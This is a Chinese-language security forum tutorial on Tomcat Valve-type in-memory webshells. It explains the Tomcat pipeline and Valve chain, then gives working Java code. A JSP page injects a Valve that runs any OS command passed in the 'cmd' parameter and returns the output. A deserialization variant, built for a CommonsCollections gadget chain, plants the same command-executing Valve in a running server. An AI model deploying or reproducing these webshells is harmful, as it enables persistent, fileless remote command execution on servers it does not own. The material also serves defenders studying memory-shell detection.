# Tomct-Valve内存马

> **来源**: https://forum.butian.net/share/2436  
> **文章ID**: 2436

---

Java内存马 - Tomcat - Valve
------------------------

### 0x00 前言

继续tomcat内存马，这次是Valve（阀门）

### 0x01 Valve简介

在Tomcat中，Valve（阀门）是一种基本的组件，用于处理传入请求和传出响应。它们是Tomcat容器处理请求的一部分，可以被添加到特定的容器（如Engine、Host或Context）来提供额外的功能。

Valve可以被用于以下目的：

> 1. 记录日志：Valve可以用于记录访问日志、错误日志等。
> 2. 认证和授权：Valve可以用于实现用户认证和授权。
> 3. 安全性：Valve可以用于实施防火墙、IP过滤等安全性功能。
> 4. 性能监控：Valve可以用于监控请求处理性能，识别潜在的瓶颈。
> 5. 请求修改：Valve可以修改传入请求或传出响应的内容。
> 6. 负载均衡：Valve可以用于实现负载均衡策略。

#### Tomcat的管道机制

了解Valve也需要知道他作用在哪里，然后就又牵扯到了**tomcat的管道机制**：  
Tomcat的管道机制是指在处理HTTP请求时，将一系列的Valve按顺序链接在一起形成一个处理管道。每个Valve负责在请求处理过程中执行特定的任务，例如认证、日志记录、安全性检查等。这样，请求就会在管道中依次经过每个Valve，每个Valve都可以对请求进行处理或者传递给下一个Valve。

Tomcat中的管道机制主要包括以下几个重点：

> 1. Container：在Tomcat中，容器是处理HTTP请求的主要组件。容器可以是Engine、Host或Context，它们之间具有包含关系。一个Engine可以包含多个Host，一个Host可以包含多个Context。
> 2. Valve：Valve是用于处理请求和响应的组件，是Tomcat管道机制的核心。每个容器都可以包含一个或多个Valve。在处理请求时，请求会被送入容器的第一个Valve，然后根据配置的Valve顺序，请求会在管道中依次经过每个Valve。每个Valve都可以在处理请求的不同阶段插入自定义逻辑。
> 3. Pipeline：Pipeline是Tomcat中的管道对象，它持有一系列Valve，并负责按顺序执行这些Valve。每个容器（Engine、Host或Context）都有一个关联的Pipeline。Pipeline的执行顺序与Valve在配置文件中的顺序一致。
> 4. Valve基类和接口：Tomcat提供了`org.apache.catalina.Valve`接口和`org.apache.catalina.ValveBase`基类来方便Valve的实现。编写自定义Valve时，可以实现`Valve`接口或继承`ValveBase`类。
> 5. Valve链：Valve链是Pipeline中Valve的有序集合。请求在Valve链中依次流经每个Valve，直到到达最后一个Valve。

### 0x02 Valve处理流程

理论知识看完，就得来看一下Valve的具体应用了，以tomcat8.5.73为例  
直接断点来到`org.apache.coyote.http11.Http11Processor#service`  
调用连接器服务，向下跟  
![1.png](images/attach-92db1d896839082e9e941e93cd559c0a30ba53ee.png)  
`org.apache.catalina.connector.CoyoteAdapter#service`  
获取Engine，并且获取StandardEngine对应的StandardPipelive，然后调用它的first-valve  
![2.png](images/attach-9005c9bf980bc82aeb51082e36bf022992878b33.png)  
`org.apache.catalina.core.StandardEngineValve#invoke`  
这个Valve好像就只是判断了一下是否有错啥的，也没做啥，不过这不是重点，重点是：StandardEngine中的valve走完了，最后是调用StandardHost中的first-valve，到一个新的组件中了，调用first很容易理解

![3.png](images/attach-c08a40bfd8362e239867b2b1d2aa6d78a17cc185.png)  
`org.apache.catalina.valves.AbstarctAccessLogValve#invoke`

![4.png](images/attach-d8b65fd80d75171dd8d31126f4b2cfb982e649c9.png)  
`org.apache.catalina.valves.ErrorReportValve#invoke`  
![5.png](images/attach-95a4ddb8a23d7c559a8ca95f75a01dfd8c781d4e.png)  
`org.apache.catalina.core.StandardHostValve#invoke`  
到这里，开始使用StandardContext获取对应的StandardPipeline

![6.png](images/attach-aa400f0a5f1e52ce3101ab1a372f1380af668072.png)  
`org.apache.catalina.authenticator.AuthenticatorBase#invoke`

![7.png](images/attach-08eee26b52f068fb6d47359f7a7a593bb12181dc.png)  
`org.apache.catalina.core.StandardContextValve#invoke`

这个valve就干了一些正经事了，主要是以下几件事

> 1. 禁止直接访问WEB-INF或META-INF下的资源
> 2. 选择对应的Warpper
> 3. 是否支持异步

![8.png](images/attach-ffaa630362e274a5046d4b516389c31497d2b0dd.png)  
`org.apache.catalina.core.StandardWarpperValve#invoke`  
![9.png](images/attach-8cb81ee7058fd0021745dd2c92a4988712da027c.png)  
到这里就算是走到终点了，接下来就是处理调用Filter链、Servlet处理请求了  
换个图显示一下，就是如下这种形式

![10.png](images/attach-87ead4601bf035ceeec0bf234ed3e20d6a680c3d.png)  
再改一下图，就是这种的了

![11.png](images/attach-6aa33fb520608ba8b151e530542256a51e3eaa08.png)  
除了basic之外，first和next都可以是空，从StandardEngine的first-valve --- > StandardWarpper的baisc-valve，整个这个算是构造成了一条valve链，请求时，依次执行，业务逻辑执行结束后，依次返回。

### 0x03 添加自定义Valve

大概了解了valve是干什么的之后，就可以尝试自行实现一个valve了，从上面能够看出，在Engine、Host、Context、Warpper这四个组件中，其实都有一些固有的Valve，比如`StandardWrapperValve`，`StandardHostValve`，而这些类其实又都是继承了BaseValve

![12.png](images/attach-930d071d77350e9cd617e39494fced94cbad727a.png)  
然后就是照着写就完了，重点就是invoke

```java
public class TestValve extends ValveBase {
    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        System.out.println("自定义的valve执行...");
        // 防止程序到这中断，需要继续调用下一个valve
        getNext().invoke(request,response);
    }
}
```

同时这四个组件都有对应的`StandardPipeline`，虽然类都是那个类，但是里面的内容确实有一定区别的（主要体现在对应不同组件时，里面的valve不一样），来看一下这个类

![13.png](images/attach-5d99d4cdad5a3015f2f3af87058a480a6c6008fa.png)  
在理解管道机制之后看这个类也是比较轻松的，有几个对于valve比较关键的方法，也都在图中进行了标注，需要格外注意的就是`org.apache.catalina.core.StandardPipeline#addValve`了

![14.png](images/attach-2547bcd2b7d27f2870f40f939f88ebefaedc4f44.png)  
到这里，其实还有一点，就是如何向特定的组件(Engine、Context等)添加Valve，其实在前面的处理流程成有一定的提示，比如`wrapper.getPipeline().getFirst().invoke(request, response);`这段代码，首先通过`StandardWrapper`获取对应的`StandardPipelive`，然后获取first-valve，再调用invoke

所以，想要向指定的组件内添加Valve就首先要获取对应组件的对象，然后`getPipeline().addVlave(new TestValve())`

上代码，比如向Engine组件中添加Valve

```java
@WebServlet(name = "addEngineValve", value = "/addEngineValve")
public class AddEngineValve extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            Field fieldRequest = request.getClass().getDeclaredField("request");
            fieldRequest.setAccessible(true);
            Request req = (Request) fieldRequest.get(request);
            // 获取StandardContext
            StandardContext standardContext= (StandardContext)req.getContext();
            // 获取StandardHost
            StandardHost standardHost = (StandardHost) standardContext.getParent();
            // 获取StandardEngine
            StandardEngine standardEngine = (StandardEngine) standardHost.getParent();
            // 添加自定义的valve
            standardEngine.getPipeline().addValve(new TestValve());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        doGet(request,response);
    }
}
```

![15.png](images/attach-eedde8bb3c168885dd9426b98b57b17a98c6ae2a.png)

![16.png](images/attach-a58b617a36982b08ef62168a21188fd5d27699c4.png)

### 0x04 Valve内存马实现

#### JSP实现

接下来就是通过jsp来实现valve的内存马了，写法几乎一模一样

```jsp
<html>
<head>
    <title>JSP动态注入Valve</title>
</head>
<body>
<%!
    public class ShellValve extends ValveBase {
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            response.setContentType("text/plain");
            response.setCharacterEncoding("utf-8");
            String cmd = request.getParameter("cmd");
            try {
                // 执行系统命令
                Process process = Runtime.getRuntime().exec(cmd);
                // 读取命令输出
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }

                // 等待命令执行完成
                int exitCode = process.waitFor();
                output.append("\n命令执行完成，退出码为 " + exitCode);
                // 输出命令输出结果到客户端
                response.getWriter().print(output.toString());
            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            getNext().invoke(request,response);
        }
    }
%>

<%
    try {
        Field fieldRequest = request.getClass().getDeclaredField("request");
        fieldRequest.setAccessible(true);
        Request req = (Request) fieldRequest.get(request);
        StandardContext standardContext= (StandardContext)req.getContext();
        StandardWrapper standardWrapper = (StandardWrapper) req.getWrapper();
        StandardHost standardHost = (StandardHost) standardContext.getParent();
        StandardEngine standardEngine = (StandardEngine) standardHost.getParent();
        // 向那个组件中添加，就使用哪个组件获取对应的StandardPipeline
        Valve shellValve = new ShellValve();
        standardEngine.getPipeline().addValve(shellValve);
    } catch (Exception e) {
        e.printStackTrace();
    }
%>
</body>
</html>
```

![17.png](images/attach-e453dc8073694b05497a37c41ae4a70e29488855.png)

#### 反序列化实现

反序列化实现Valve内存马时，就不能继承ValveBase这个类了，而是需要实现Valve接口，因为java的单继承模式。  
服务端就是接收base64编码后的序列化字符串，解码，然后反序列化，CC的版本为3.1，然后还是使用CC3

```java
public class SerValve extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet implements Valve {
    static {
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        // StandardContext
        Context context = webappClassLoaderBase.getResources().getContext();
        context.getPipeline().addValve(new SerValve());
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public Valve getNext() {
        return null;
    }

    @Override
    public void setNext(Valve valve) {

    }

    @Override
    public void backgroundProcess() {

    }

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        try {
            if (cmd != null && cmd != "") {
                Process process = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                process.waitFor();
                response.getWriter().write(output.toString());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        request.getContext().getPipeline().getBasic().invoke(request,response);
    }

    @Override
    public boolean isAsyncSupported() {
        return false;
    }
}
```

![18.png](images/attach-b048b04da87ed42c1a5eb8f5b87f59adfa3eaf41.png)

### 0x05 总结

个人感觉绕的地方就是在于每个组件都有对应的`StandardPipeline`，一开始跟的时候，以为就一个`StandardPipeline`发现莫名其妙里面的值就变了，绕了一段时间。最后，文章写的不咋样，望见谅。

### 0x06 参考链接

- [Java 内存马系列-06-Tomcat 之 Valve 型内存马](https://drun1baby.top/2022/09/07/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-06-Tomcat-%E4%B9%8B-Valve-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/)
- [Tomcat内存马之Valve和WebSocket型](https://www.freebuf.com/articles/web/365822.html)
- [擅长捉弄的内存马同学：Valve内存马](https://www.freebuf.com/articles/web/348663.html)
- [浅析Tomcat架构上的Valve内存马(内存马系列篇十一)](https://www.freebuf.com/vuls/346943.html)
- [Tomcat内存马——Filter/servlet/Listener/valve](https://xz.aliyun.com/t/11988#toc-20)
